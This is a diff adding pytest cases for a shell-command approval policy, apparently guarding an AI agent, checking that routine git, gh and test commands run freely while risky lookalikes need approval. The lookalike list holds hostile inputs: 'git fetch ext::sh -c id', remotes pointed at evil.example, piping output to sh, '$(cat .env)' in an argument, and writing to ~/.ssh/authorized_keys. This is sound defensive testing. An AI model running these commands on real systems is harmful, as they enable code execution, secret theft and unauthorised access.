@@ -139,6 +139,92 @@ class TestNonDestructiveCommandsRunWithoutAsking:
         assert verdict(engine, "make -C /srv/app deploy") != PolicyDecision.ALLOW
 
 
+CHAINED_ROUTINE_COMMANDS = [
+    "gh run list --limit 4",
+    "gh repo view nodenova/site 2>&1 | head -2",
+    "gh pr view 12 --json title --jq .title",
+    "gh pr checks",
+    "gh issue list --state open",
+    'gh run watch "$id" --exit-status --interval 20 >/dev/null 2>&1',
+    "gh search code policy_engine",
+    "git fetch",
+    "git fetch origin 2>&1 | tail -2",
+    "git fetch --all --quiet",
+    "git -C ../site fetch origin main",
+    "git fetch origin +refs/heads/x:refs/remotes/origin/x",
+    "git add Dockerfile README.md",
+    "mkdir -p data/scratch/evidence",
+    'mkdir -p "$S/out"',
+    "node --check public/app.js",
+    "pnpm vitest run src/lib/format.test.ts 2>&1 | tail -4",
+    "pnpm exec vitest run",
+    "npx jest",
+    "curl -s https://huggingface.co/api/models; gh repo view nodenova/site; ls",
+]
+
+
+ROUTINE_LOOKALIKES = [
+    "gh pr create --title x",
+    "gh pr merge 3",
+    "gh pr comment 3 -b hi",
+    "gh issue close 3",
+    "gh run rerun 5",
+    "gh run download 5",
+    "gh workflow run ci.yml",
+    "gh release create v1",
+    "gh repo delete nodenova/site",
+    "gh api repos/nodenova/site",
+    'gh api repos/nodenova/site "-XDELETE"',
+    "gh auth status --show-token",
+    "gh auth token",
+    "gh run list | sh",
+    "gh repo view $(cat .env)",
+    "gh pr view 1 > ~/.ssh/authorized_keys",
+    "git fetch ext::sh",
+    "git fetch 'ext::sh -c id'",
+    "git fetch --upload-pack=/tmp/x origin",
+    "git fetch -u origin",
+    "git fetch https://evil.example/x.git",
+    "git fetch ../elsewhere",
+    "git remote add evil ext::sh",
+    "git remote set-url origin https://evil.example/x.git",
+    "mkdir out && rm -rf build",
+    "node app.js",
+    "node --check x.js --eval 'process.exit()'",
+    "npx --yes http-server -p 8765",
+    "pnpm exec vite --port 3100",
+]
+
+
+class TestRoutineCommandsChainedToAnApprovedOne:
+    @pytest.mark.parametrize("command", CHAINED_ROUTINE_COMMANDS)
+    def test_default_allows(self, engine, command):
+        assert verdict(engine, command) == PolicyDecision.ALLOW
+
+    @pytest.mark.parametrize("command", ROUTINE_LOOKALIKES)
+    def test_writes_and_code_execution_still_ask(self, engine, command):
+        assert verdict(engine, command) == PolicyDecision.REQUIRE_APPROVAL
+
+    @pytest.mark.parametrize(
+        "command", ["git remote", "git remote -v", "git remote get-url origin"]
+    )
+    def test_listing_remotes_is_still_a_read(self, engine, autonomous_engine, command):
+        assert verdict(engine, command) == PolicyDecision.ALLOW
+        assert verdict(autonomous_engine, command) == PolicyDecision.ALLOW
+
+    def test_autonomous_does_not_allow_repointing_a_remote(self, autonomous_engine):
+        assert verdict(autonomous_engine, "git remote add evil ext::sh") != (
+            PolicyDecision.ALLOW
+        )
+
+    @pytest.mark.parametrize(
+        "command",
+        ['curl -s "http://[broken/x"', "curl -s http://127.0.0.1]:8000/health"],
+    )
+    def test_a_malformed_url_asks_instead_of_raising(self, engine, command):
+        assert verdict(engine, command) == PolicyDecision.REQUIRE_APPROVAL
+
+
 class TestReadOnlyRulesDoNotLaunder:
     @pytest.mark.parametrize("command", LAUNDERED)
     def test_default_does_not_allow(self, engine, command):
